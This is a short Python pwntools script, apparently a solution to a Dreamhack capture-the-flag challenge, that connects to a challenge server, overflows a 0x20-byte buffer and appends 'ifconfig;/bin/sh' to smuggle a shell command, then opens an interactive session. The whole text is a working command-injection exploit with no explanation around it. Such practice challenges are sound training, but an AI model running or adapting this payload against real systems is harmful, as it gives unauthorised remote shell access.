from pwn import *

p = remote("host3.dreamhack.games", 20683)
context.log_level='debug'

payload = b"A" * 0x20 + b"ifconfig" + b";/bin/sh"
p.send(payload)
p.interactive()


